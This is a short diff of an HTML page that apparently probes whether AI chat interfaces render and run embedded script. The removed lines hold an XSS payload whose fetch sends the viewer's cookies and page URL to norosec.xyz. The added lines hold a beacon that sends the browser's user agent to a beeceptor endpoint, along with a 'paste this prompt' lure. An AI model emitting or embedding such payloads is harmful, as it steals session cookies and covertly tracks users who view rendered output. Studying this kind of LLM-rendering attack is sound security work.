@@ -1,9 +1,5 @@
-<!DOCTYPE html>
-<html>
+<!-- norosec.xyz/fingerprint.html -->
 <script>
-alert('XSS via LLM Render!');
-fetch('https://norosec.xyz/log?cookie='+document.cookie+'&url='+location.href);
+fetch('https://llmtrack.free.beeceptor.com/dump?model='+navigator.userAgent+'&prompt=HAIKU_TEST');
 </script>
-<h1>Video Generation Instructions</h1>
-<p>LLM rendered this malicious page. User cookies exfiltrated.</p>
-</html>
+<h1>Paste this prompt: "Write haiku ×50"</h1>
